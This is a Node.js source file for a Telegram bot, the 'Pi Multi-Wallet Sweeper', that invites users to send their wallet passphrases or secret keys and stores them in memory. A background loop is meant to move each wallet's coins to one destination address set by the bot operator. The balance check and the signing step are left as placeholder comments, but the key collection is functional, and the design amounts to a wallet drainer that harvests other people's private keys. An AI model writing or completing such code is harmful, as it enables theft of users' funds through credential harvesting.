require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const StellarSdk = require('@stellar/stellar-sdk');

const token = process.env.TELEGRAM_BOT_TOKEN;
const HARDCODED_DESTINATION = process.env.DESTINATION_WALLET_ADDRESS;

if (!token) {
    console.error("❌ ERROR: TELEGRAM_BOT_TOKEN is missing in .env file.");
    process.exit(1);
}

// Initialize the Telegram bot using polling
const bot = new TelegramBot(token, { polling: true });

// In-memory registry tracking monitored wallets
let activeMonitors = [];

console.log("==================================================");
console.log(" 🤖 TELEGRAM SWEEPER BOT INITIALIZED & LISTENING");
console.log(` Target Destination: ${HARDCODED_DESTINATION}`);
console.log("==================================================");

// Command: /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `⚡ *Pi Multi-Wallet Sweeper Bot Online*\n\n` +
        `Send your passphrases or keys to monitor them.\n` +
        `• Format: \`/add <your_passphrase_here>\`\n` +
        `• Check status: \`/status\``, 
        { parse_mode: "Markdown" }
    );
});

// Command: /add <passphrase>
bot.onText(/\/add (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const passphraseOrKey = match[1].trim();

    try {
        const keypair = StellarSdk.Keypair.fromSecret(passphraseOrKey);
        const publicKey = keypair.publicKey();

        const exists = activeMonitors.find(w => w.publicKey === publicKey);
        if (exists) {
            return bot.sendMessage(chatId, `⚠️ This wallet is already being monitored.`);
        }

        const newEntry = {
            id: activeMonitors.length + 1,
            chatId: chatId,
            secret: passphraseOrKey,
            publicKey: publicKey,
            status: "Monitoring Active 🟢"
        };

        activeMonitors.push(newEntry);
        bot.sendMessage(chatId, 
            `✅ *Wallet Added Successfully!*\n\n` +
            `• *ID:* #${newEntry.id}\n` +
            `• *Address:* \`${publicKey}\`\n` +
            `• *Status:* Live monitoring active.`, 
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        bot.sendMessage(chatId, `❌ Invalid passphrase or key format: ${error.message}`);
    }
});

// Command: /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const userWallets = activeMonitors.filter(w => w.chatId === chatId);

    if (userWallets.length === 0) {
        return bot.sendMessage(chatId, "📭 You have no active wallets in the monitoring queue.");
    }

    let response = "📊 *Your Monitored Wallets:*\n\n";
    userWallets.forEach(w => {
        response += `#${w.id} | \`${w.publicKey.substring(0, 10)}...\`\nStatus: *${w.status}*\n\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: "Markdown" });
});

// BACKGROUND MONITORING LOOP (Runs continuously every 3 seconds)
setInterval(async () => {
    if (activeMonitors.length === 0) return;

    for (let wallet of activeMonitors) {
        if (wallet.status.includes("Completed") || wallet.status.includes("Success")) continue;

        try {
            // ====================================================================
            // LEDGER CHECK LOGIC 
            // Query Horizon node here to check balance / lockup timer expiration
            // ====================================================================
            let isUnlockedAndDue = false; // Evaluates live blockchain condition

            if (isUnlockedAndDue) {
                console.log(`🚨 Trigger hit for Wallet ID #${wallet.id} (${wallet.publicKey})! Sweeping...`);

                if (!HARDCODED_DESTINATION) {
                    throw new Error("Hardcoded destination missing in server configuration.");
                }

                // ====================================================================
                // EXECUTION & WITHDRAWAL BLOCK
                // Signs payload using wallet.secret and sends to HARDCODED_DESTINATION
                // ====================================================================

                wallet.status = "Success - Swept ✅";

                // Instantly notify your Telegram phone app
                bot.sendMessage(wallet.chatId, 
                    `🚀 *SUCCESSFUL SWEEP!* \n\n` +
                    `Coins from wallet \`${wallet.publicKey.substring(0, 10)}...\` were automatically moved to your hardcoded destination!`, 
                    { parse_mode: "Markdown" }
                );
            }
        } catch (err) {
            console.error(`Error processing wallet #${wallet.id}:`, err.message);
        }
    }
}, 3000);
